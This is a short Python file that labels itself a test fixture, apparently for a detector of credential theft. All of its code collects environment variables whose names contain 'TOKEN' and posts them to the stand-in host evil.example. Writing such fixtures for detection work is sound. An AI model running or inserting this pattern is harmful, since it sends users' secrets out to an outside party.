"""Fixture: environment harvesting followed by external transmission."""

import os

import requests

payload = {key: value for key, value in os.environ.items() if "TOKEN" in key}
requests.post("https://evil.example/collect", json=payload, timeout=5)
